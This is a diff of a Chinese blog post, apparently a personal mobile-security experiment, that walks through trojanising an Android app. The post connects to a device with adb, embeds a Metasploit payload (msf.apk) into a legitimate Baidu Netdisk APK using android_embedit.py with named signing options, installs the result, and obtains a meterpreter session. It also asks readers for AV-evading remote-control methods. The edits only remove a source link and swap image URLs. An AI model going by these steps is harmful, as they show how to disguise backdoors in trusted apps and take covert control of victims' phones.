@@ -10,8 +10,7 @@ tags:
     - 移动安全
 ---
 
-最近在学习移动安全，刚好在先知看到一篇文章感觉很有意思就做了个实验
-原文链接：https://xz.aliyun.com/t/2967?acc ... 9-9f74-6db67ec9a7f5
+
 大家有啥更好的apk远控方法可以一块来交流交流
 目前我知道的就只有
 ①DroidJack 不免杀
@@ -76,7 +75,7 @@ adb devices
 ​    2）接着执行adb connect 172.16.4.37:5555，这时候应该就能连接成功了
 ​      成功提示：connected to 172.16.4.37:5555
 
-![1.png](https://www.t00ls.net/attachment.php?aid=NzExMDF8NTZhMjVmNDZ8MTU0NDcwOTg5MnxmNjU3QmFSNUJxckJ2MGRlWTNSUXg4V1dEa2JHMzRhTCtDZU05a2VaTXhUSWV1bw%3D%3D&noupdate=yes)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehopd3flj20e004ot95.jpg)
 
 ⑤使用脚本将msf.apk嵌入正常apk
 python3 android_embedit.py -kp cowboys -kn cowboys -ks cowboys.keystore BaiduNetd isk_8.12.7.apk msf.apk
@@ -85,15 +84,15 @@ ks 为签名名称
 ks 是keystore文件
 生成效果大概是这样...我当时忘了截图
 
-![2.png](https://www.t00ls.net/attachment.php?aid=NzExMDJ8NDdjMTI1YmF8MTU0NDcwOTg5MnxmNjU3QmFSNUJxckJ2MGRlWTNSUXg4V1dEa2JHMzRhTCtDZU05a2VaTXhUSWV1bw%3D%3D&noupdate=yes)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehowxy46j21400cnq4x.jpg)
 
 另外要提的是  当时我本来选定的apk是某云的，后来反编译的时候文件出错，一直没成功，弄了一下午就放弃了
 
-![3.png](https://www.t00ls.net/attachment.php?aid=NzExMDN8ZDg1ZTc5M2Z8MTU0NDcwOTg5MnxmNjU3QmFSNUJxckJ2MGRlWTNSUXg4V1dEa2JHMzRhTCtDZU05a2VaTXhUSWV1bw%3D%3D&noupdate=yes)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehp9x7r9j20p30gotay.jpg)
 
 ⑥安装apk
 adb install final.apk
 
 ⑦meterpreter上线
 
-![4.png](https://www.t00ls.net/attachment.php?aid=NzExMDR8ZjRkN2UzNDB8MTU0NDcwOTg5MnxmNjU3QmFSNUJxckJ2MGRlWTNSUXg4V1dEa2JHMzRhTCtDZU05a2VaTXhUSWV1bw%3D%3D&noupdate=yes)	
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehpy5dwij20ig0exq4x.jpg)
